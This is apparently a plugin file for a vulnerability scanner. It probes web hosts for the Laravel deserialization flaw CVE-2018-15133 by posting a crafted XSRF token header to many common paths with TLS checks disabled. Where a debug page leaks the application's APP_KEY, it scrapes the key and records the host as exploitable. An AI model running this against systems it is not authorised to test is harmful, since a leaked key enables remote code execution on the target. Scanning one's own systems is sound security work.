import requests
import re


from celery_app.utils.utils import insert_vuln_db
from celery_app.config.config import web_port_short

#Laravel反序列化漏洞（CVE-2018-15133）
plugin_id=68
default_port_list=web_port_short

def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    headers = {
        'X-XSRF-TOKEN': 'eyJpdiI6ICJhMlY1YzJ0bGVYTnJaWGx6YTJWNWN3PT0iLCAidmFsdWUiOiAiZDZmMjdjYjEwYTk2YWIwNDY0OGUzNmI5OTYxZDU1ZjgxNjhhN2NmOTg4MjM5NjNmNTE4NDllMTkwMDE1NTkyZDFlZmQwZDgzZWJmNjY4NTFkNmZiZWRjNGQ0ZjdiNmZiOGIzYmIyNzhmYjY2MzUyNTVjMzk2NTViNTg5OWRjZTg1ODNiNTgzMjUzOTkzZjQ2NTAxZmFlODUxOGQ4MTIyNGQ0YmQwZGZhMDJhMWE2ZmQ3OGFhZmRlYzI5MWQxNmQzOGI1NTkwMTg5MDlhMjdkYjYzMmY4NzhiY2FkMWU5MWM0OTNiYTc1ZDU3YjE1MjNhZTg1MTg3ZTg1ZmJhNmE3ZmExODQxYTRlZTUxYTIxYWI4MjBiNGNmYzU0MGEzZGJmNzVhMmZiOGFmYzUzNGU0ZDUyYmMzOTcyNmQ0MTE1OTRhMDg2N2MzNjBhYTdlYzhiMmZkOTg5NGNjMzY0ZDVlNWMzZTgyZjQwMGYyMzFiYmI1ZTAyMGVhZTU1MTFkMWRjIiwgIm1hYyI6ICJmYmJkZDY4YTI3MWY5YWRjZmYyNmNjODFjMzlhZWZlNjg1MDdiZjRhNDczOWZhN2IwMmQ3YjhhNjYyYTE0ZDVhIn0='}
    try:
        uris = [
            "/login",
            "/site",
            "/site/login",
            "/server/order/salerchange",
            "/api/want-read-book/store",
            "/",
            "/upload",
            "/search",
            "/api/password",
            "/send",
            "/test",
            "/msg",
            "/check",
            "/auth/login",
            "/auth/logout",
            "/log",
            "/staff/login",
            "/login/check",
            "/server",
            "/update",
            "/user",
            "/user/info",
            "/userinfo",
            "/userInfo",
            "/api/upload",
            "/api/book",
            "/api/books",
            "/api/login",
            "/api/user",
            "/user/login",
            "/user/logout"
        ]
        targets = ['{}{}'.format(target, uri) for uri in uris]
        requests.packages.urllib3.disable_warnings()
        with requests.Session() as session:
            for target in targets:
                response = session.post(target, timeout=7, verify=False, headers=headers)
                if "The MAC is invalid" in response.text and 'decrypt($header)' in response.text:
                    if '>APP_KEY<' in response.text:
                        app_key = re.findall('characters">base64:(.*?)</span>', response.text)
                        output = '存在Laravel反序列化漏洞CVE-2018-15133(可利用),\nURL:\n{}\nAPP_KEY:\n{}'.format(target,
                                                                                                      app_key[0])
                    else:
                        output = '存在Laravel反序列化漏洞CVE-2018-15133,\nURL:\n{}'.format(target)
                    insert_vuln_db(host, target, output, plugin_id)
                    return True, host, target, output

    except Exception as error:
        return False
    return False

